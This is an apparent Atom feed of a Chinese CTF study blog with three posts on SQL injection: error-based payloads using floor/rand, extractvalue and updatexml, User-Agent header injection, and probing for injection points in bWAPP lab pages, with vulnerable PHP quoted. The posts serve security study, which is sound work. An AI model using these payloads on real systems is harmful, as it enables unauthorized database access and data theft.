<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CCClemT&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-07-07T15:33:59.228Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>CCClem_T</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>报错注入</title>
    <link href="http://example.com/2023/07/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/07/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2023-07-07T15:29:59.000Z</published>
    <updated>2023-07-07T15:33:59.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="报错注入-Error-based-Injection"><a href="#报错注入-Error-based-Injection" class="headerlink" title="报错注入(Error based Injection)"></a>报错注入(Error based Injection)</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>一种SQL注入的类型，用于使SQL语句报错的语法，用于注入结果无回显但<strong>错误信息</strong>有输出的情况。</p><p>返回的错误信息即是攻击者需要的信息。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>BigInt等数据类型溢出；</li><li>Xpath语法错误；</li><li>count() + rand() + groud_by() 导致重复(主键冲突)；</li><li>空间数据类型函数错误</li></ol><p>等…</p><hr><h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><ol><li>floor函数;</li><li>extractvalue函数；（最多32字符）</li><li>updatexml函数；</li><li>exp()函数；</li></ol><hr><h4 id="rand-N"><a href="#rand-N" class="headerlink" title="rand([N])"></a>rand([N])</h4><p>返回一个一个随机浮点数v，范围是0&lt;&#x3D;v&lt;1.0</p><p>N是可选提供的，如果提供了N，则会设定N为一个SEED。</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224109937.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224109937.png" alt="image-20230627224109937"></p><p>可以看到在不设置种子的情况下两次的值都不同；</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224146233.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224146233.png" alt="image-20230627224146233"></p><p>而在设置种子均为 0 的情况下，rand()函数返回的随机序列相同。</p><h4 id="floor-x"><a href="#floor-x" class="headerlink" title="floor(x)"></a>floor(x)</h4><p>返回不大于x的最大整数</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224621119.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224621119.png" alt="image-20230627224621119"></p><h4 id="count-x"><a href="#count-x" class="headerlink" title="count(x)"></a>count(x)</h4><p>返回x数据集的数量</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224738735.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230627224738735.png" alt="image-20230627224738735"></p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>用于结合聚合函数，根据一个或多个列对结果集进行分组。</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230630101554525.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230630101554525.png" alt="image-20230630101554525"></p><hr><h4 id="extractvalue-目标xml文档，xml路径"><a href="#extractvalue-目标xml文档，xml路径" class="headerlink" title="extractvalue(目标xml文档，xml路径)"></a>extractvalue(目标xml文档，xml路径)</h4><p>对XML文档进行查询的函数。</p><p>xml格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‘x’的路径：&#x2F;a&#x2F;b ; ‘123’的路径：&#x2F;a&#x2F;c</p><h4 id="updatexml-目标xml文档，xml路径，更新的内容"><a href="#updatexml-目标xml文档，xml路径，更新的内容" class="headerlink" title="updatexml(目标xml文档，xml路径，更新的内容)"></a>updatexml(目标xml文档，xml路径，更新的内容)</h4><p>updatexml()函数与extractvalue()函数类似，都是对xml文档进行操作。只不过updatexml()是更新文档的函数。</p><h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><h3 id="floor报错（测试数据库版本为5-7-26）"><a href="#floor报错（测试数据库版本为5-7-26）" class="headerlink" title="floor报错（测试数据库版本为5.7.26）"></a>floor报错（测试数据库版本为5.7.26）</h3><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select count(*),concat(user(),floor(rand(0)*2))x from table_name group by x;--+<br></code></pre></td></tr></table></figure><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707164928330.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707164928330.png" alt="image-20230707164928330"></p><h4 id="原理-具体参考-此处-MySQL-floor-报错原理分析-FreeBuf网络安全行业门户"><a href="#原理-具体参考-此处-MySQL-floor-报错原理分析-FreeBuf网络安全行业门户" class="headerlink" title="原理(具体参考[此处](MySQL floor()报错原理分析 - FreeBuf网络安全行业门户))"></a>原理(具体参考[此处](<a href="https://www.freebuf.com/articles/web/242986.html">MySQL floor()报错原理分析 - FreeBuf网络安全行业门户</a>))</h4><p>总结一下就是rand()函数会在group by 函数在临时表插入原先没有的数据的时候再运行一次，从而导致插入主键于原来有的主键冲突。</p><p>由于floor(rand(0)*2)产生的固定序列的性质，表中必须至少存在三条数据才能产生报错，根据文章内容，若将rand(0)改为__rand(14)__便能突破这一限制，使得仅需两条数据就能产生报错。</p><p>值得一提的是，当我更改MySQL数据库的版本至8.0.32时不出现报错：</p><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707171003694.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707171003694.png" alt="image-20230707171003694"></p><p>推测此版本修复了该内容，至于从什么时候开始并不清楚。</p><h3 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h3><h4 id="extractvalue-报错"><a href="#extractvalue-报错" class="headerlink" title="extractvalue()报错"></a>extractvalue()报错</h4><p>函数的第二个参数是可以进行操作的地方，xml文件中查询使用的是&#x2F;xx&#x2F;xx&#x2F;的格式，如果我们写成其他的格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法格式的内容就是我们想要查询的内容。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select extractvalue(null,concat(0x7e,(select @@version),0x7e));--+<br></code></pre></td></tr></table></figure><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707231655962.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707231655962.png" alt="image-20230707231655962"></p><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select extractvalue(null,concat(0x5c,(select @@version),0x5c));--+<br></code></pre></td></tr></table></figure><p class='item-img' data-src='/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707231827827.png'><img src="/../images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230707231827827.png" alt="image-20230707231827827"></p><ul><li>第二个逗号后的0x7e(5c)可有可无</li></ul><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>使用extractvalue函数时，路径的正确格式为&#x2F;xxx&#x2F;xxx&#x2F;而0x7e(‘~’)和0x5c(‘\‘),从而使得sql语句变得非法。</p><h4 id="updatexml-报错"><a href="#updatexml-报错" class="headerlink" title="updatexml()报错"></a>updatexml()报错</h4><p>updatexml()报错与extractvalue()报错原理相同，且都是对第二个参数即xml路径进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select updatexml(1,concat(0x5c,(select database()),0x5c),1);--+<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;报错注入-Error-based-Injection&quot;&gt;&lt;a href=&quot;#报错注入-Error-based-Injection&quot; class=&quot;headerlink&quot; title=&quot;报错注入(Error based Injection)&quot;&gt;&lt;/a&gt;报错注入(Er</summary>
      
    
    
    
    <category term="CTF-WEB" scheme="http://example.com/categories/CTF-WEB/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HTTP头注入</title>
    <link href="http://example.com/2023/06/27/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/06/27/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/</id>
    <published>2023-06-26T16:45:05.000Z</published>
    <updated>2023-06-26T16:47:13.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>针对HTTP的请求头，如果不加以过滤或者转义，在直接与数据库交互的过程中容易被利用进行SQL注入攻击，即HTTP头注入。</p><blockquote><p>常见场景：访问Web Server时，Web Server会从HTTP Header中取出浏览器信息、IP地址、HOST信息等存储到数据库中。</p></blockquote><h2 id="实例测试"><a href="#实例测试" class="headerlink" title="实例测试"></a>实例测试</h2><p class='item-img' data-src='/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626105842381.png'><img src="/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626105842381.png" alt="image-20230626105842381"></p><ul><li>前提观察:无任何输入点，回显有访问时间，IP地址，以及User-Agent。</li></ul><p>使用BP抓包拦截。</p><p class='item-img' data-src='/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111306953.png'><img src="/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111306953.png" alt="image-20230626111306953">尝试修改User-Agent观察是否有修改，</p><p class='item-img' data-src='/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111531078.png'><img src="/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111531078.png" alt="image-20230626111531078"></p><p>发现回显修改了，推测服务器直接从User-Agent取值然后存入数据库中，尝试判断是否存在注入点。</p><p class='item-img' data-src='/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111745121.png'><img src="/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230626111745121.png" alt="image-20230626111745121"></p><p>通过单引号闭合’发现报错。</p><p>现在查看一下后端代码：</p><blockquote><p>贴出关键代码段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mysql">$ip_address = $_SERVER[&quot;REMOTE_ADDR&quot;];<br>$user_agent = $_SERVER[&quot;HTTP_USER_AGENT&quot;];<br><br>// Writes the entry into the database<br>$sql = &quot;INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), &#x27;&quot; . sqli($user_agent) . &quot;&#x27;, &#x27;&quot; . $ip_address . &quot;&#x27;)&quot;;<br><br>$recordset = $link-&gt;query($sql);<br><br>if(!$recordset)<br>&#123;<br><br>    die(&quot;Error: &quot; . $link-&gt;error);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现服务器的操作是通过 INSERT INTO VALUES 语句ip_address 和 user-agent 插入数据库中且第一个参数为user-agent，第二个为ip_address。</p><p>由此我们开始构造注入语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hack&#x27;,(selectdatabase()));#<br></code></pre></td></tr></table></figure><p class='item-img' data-src='/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230627002653519.png'><img src="/../images/HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20230627002653519.png" alt="image-20230627002653519"></p><p>成功注入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP头注入&quot;&gt;&lt;a href=&quot;#HTTP头注入&quot; class=&quot;headerlink&quot; title=&quot;HTTP头注入&quot;&gt;&lt;/a&gt;HTTP头注入&lt;/h1&gt;&lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定</summary>
      
    
    
    
    <category term="CTF-WEB" scheme="http://example.com/categories/CTF-WEB/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>判断sql注入点</title>
    <link href="http://example.com/2023/05/13/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/"/>
    <id>http://example.com/2023/05/13/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/</id>
    <published>2023-05-12T16:25:13.000Z</published>
    <updated>2023-05-13T03:18:33.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h1><h2 id="判断关键"><a href="#判断关键" class="headerlink" title="判断关键"></a>判断关键</h2><ul><li>判断该访问目标URL是否存在SQL注入?</li><li>如果存在SQL注入，那么属于哪种SQL注入?</li></ul><blockquote><p>只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入</p></blockquote><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><ul><li>单引号判断法</li></ul><p>​如果页面返回错误，则存在SQL注入。</p><p>​原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</p><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>通常SQL注入分为两种:数字型、字符型</p><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230510234533782.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230510234533782.png" alt="image-20230510234533782"></p><blockquote><p>本节中测试均以该表为原型</p></blockquote><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>通常语句类型为<code>select * from &lt;表名&gt; where id = x</code></p><p>通常构造 <code>and 1=1</code>以及<code>and 1=2</code>来判断</p><ul><li>测试</li></ul><p>​1. <code>select * from test where id=1 and 1=1;</code></p><p>​<img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512205948976.png" alt="image-20230512205948976"></p><p>​2. <code>select * from test where id=1 and 1=2;</code></p><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512210149298.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512210149298.png" alt="image-20230512210149298"></p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>通常语句类型为<code>select * from &lt;表名&gt; where id = &#39;x&#39;</code></p><p>通常构造<code>and &#39;1&#39;=&#39;1</code>以及<code>and &#39;1&#39;=&#39;2</code>来判断</p><ul><li>测试</li></ul><p>​1. <code>select * from test where gender = &#39;M&#39;and&#39;1&#39;=&#39;1&#39;;</code></p><p>​<img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512210402450.png" alt="image-20230512210402450"></p><p>​2. <code>select * from test where gender = &#39;M&#39;and&#39;1&#39;=&#39;2&#39;;</code></p><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512210458810.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512210458810.png" alt="image-20230512210458810"></p><hr><h2 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h2><blockquote><p>bWAPP靶场</p></blockquote><h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512211327926.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512211327926.png" alt="image-20230512211327926"></p><p> <code>https://bwapp.exp-9.com/sqli_1.php?title=t&amp;action=search</code></p><ul><li>由URL可知注入类型为字符型；</li><li>尝试直接在搜索框进行测试:</li></ul><p>​<code>&#39;t&#39; and &#39;1&#39;=&#39;1 #</code></p><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512213900018.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512213900018.png" alt="image-20230512213900018"></p><ul><li><strong>出现错误</strong>,修改后再尝试：</li></ul><p>​<code>t%&#39; and &#39;1&#39; = &#39;1&#39; #</code></p><p class='item-img' data-src='/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512230912730.png'><img src="/../images/%E5%88%A4%E6%96%ADsql%E6%B3%A8%E5%85%A5%E7%82%B9/image-20230512230912730.png" alt="image-20230512230912730"></p><ul><li>成功了接下来探究原因。</li></ul><h3 id="探究原因"><a href="#探究原因" class="headerlink" title="探究原因"></a>探究原因</h3><p>打开对应的php文件,贴出关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;title&quot;</span>]))<br>&#123;<br><br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;title&quot;</span>];<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM movies WHERE title LIKE &#x27;%&quot;</span> . <span class="hljs-title function_ invoke__">sqli</span>(<span class="hljs-variable">$title</span>) . <span class="hljs-string">&quot;%&#x27;&quot;</span>;<br><br>    <span class="hljs-variable">$recordset</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$recordset</span>)<br>    &#123;<br><br>        <span class="hljs-comment">// die(&quot;Error: &quot; . mysql_error());</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看出，此处使用了<strong>like</strong>语法,需要闭合**’%’**并把后面不需要的内容给注释掉，综合以上得出<code>t%&#39; and &#39;1&#39; = &#39;1&#39; #</code>。</p><p>注:</p><ul><li><strong>SQL LIKE 操作符</strong></li></ul><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p><ul><li><strong>SQL LIKE 语法</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT column1, column2, ...<br>FROM table_name<br>WHERE column LIKE pattern;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><p>**column1, column2, **：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</p></li><li><p><strong>table_name</strong>：要查询的表名称。</p></li><li><p><strong>column</strong>：要搜索的字段名称。</p></li><li><p><strong>pattern</strong>：搜索模式。</p><ul><li><p>‘%a’   &#x2F;&#x2F;以a结尾的数据</p><p>‘a%’   &#x2F;&#x2F;以a开头的数据</p><p>‘%a%’   &#x2F;&#x2F;含有a的数据</p><p>‘_a_’   &#x2F;&#x2F;三位且中间字母是a的</p><p>‘_a’   &#x2F;&#x2F;两位且结尾字母是a的</p><p>‘a_’   &#x2F;&#x2F;两位且开头字母是a的</p></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;判断注入点&quot;&gt;&lt;a href=&quot;#判断注入点&quot; class=&quot;headerlink&quot; title=&quot;判断注入点&quot;&gt;&lt;/a&gt;判断注入点&lt;/h1&gt;&lt;h2 id=&quot;判断关键&quot;&gt;&lt;a href=&quot;#判断关键&quot; class=&quot;headerlink&quot; title=&quot;判断关键&quot;</summary>
      
    
    
    
    <category term="CTF-WEB" scheme="http://example.com/categories/CTF-WEB/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
